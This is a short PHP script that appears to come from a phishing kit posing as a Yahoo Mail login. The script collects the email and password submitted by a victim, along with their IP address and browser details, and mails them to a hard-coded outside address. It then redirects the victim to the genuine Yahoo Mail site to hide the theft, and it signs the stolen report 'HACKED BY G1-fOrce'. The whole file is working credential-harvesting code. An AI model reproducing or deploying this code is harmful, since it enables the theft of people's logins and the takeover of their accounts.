<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$pass = $_POST['Password'];
$own = 'moched001@gmail.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 
$sender = 'moched@xesurenet.net';
$domain = 'ALL DOMAIN';
$subj = "$domain V.4.2.2014 LOGINGS";
$headers .= "From: MOCHED<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = '';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________XECURE_________</td></tr>
 <tr><td>$domain I.D: $email  Password: $pass<td/></tr>
 <tr><td>IP: <img src='http://api.hostip.info/flag.php?ip=$ip' height='12' /> <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> / User-Agent: '$browser'</td></tr>
 <tr><td>WEB: $web URL: http://$web$inj</td></tr>
 <tr><td>Date: $server</td></tr>
 <tr><td>________HACKED BY G1-fOrce__________</td></tr>
 </BODY>
 </HTML>";
if (empty($email) || empty($pass)) {
header( "Location: Yahoo.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=$email&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: http://www.yahoomail.com ");
}
?>
